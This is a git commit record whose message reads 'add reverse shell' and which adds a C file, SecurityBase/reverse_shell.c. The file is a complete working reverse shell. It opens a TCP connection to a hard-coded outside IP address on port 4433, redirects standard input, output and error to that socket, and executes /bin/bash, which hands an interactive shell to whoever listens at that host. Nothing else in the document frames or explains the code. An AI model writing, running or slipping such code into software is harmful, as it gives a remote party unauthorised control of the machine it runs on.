6ef9b483c06a63f1c123238bd14fdfaba55b7e32
Kios <Kios@localhost.localdomain>
2018-11-19 16:52:23 +0800

    add reverse shell

---
+++ SecurityBase/reverse_shell.c
@@ -0,0 +1,24 @@
+#include <stdio.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+
+int main(int argc, char *argv[])
+{
+    struct sockaddr_in sa;
+    int s;
+
+    sa.sin_family = AF_INET;
+    sa.sin_addr.s_addr = inet_addr("119.29.231.141");
+    sa.sin_port = htons(4433);
+
+    s = socket(AF_INET, SOCK_STREAM, 0); 
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+    dup2(s, 0);
+    dup2(s, 1);
+    dup2(s, 2);
+
+    execve("/bin/bash", 0, 0);
+    return 0; 
+}
